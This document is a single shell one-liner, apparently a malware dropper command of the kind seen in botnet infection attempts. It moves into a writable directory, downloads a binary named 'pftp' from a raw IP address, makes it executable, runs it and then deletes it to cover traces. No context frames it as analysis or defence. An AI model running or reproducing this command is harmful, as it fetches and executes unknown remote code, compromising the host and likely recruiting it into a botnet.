cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.163.127/pftp; chmod +x pftp; ./pftp; rm -rf pftp
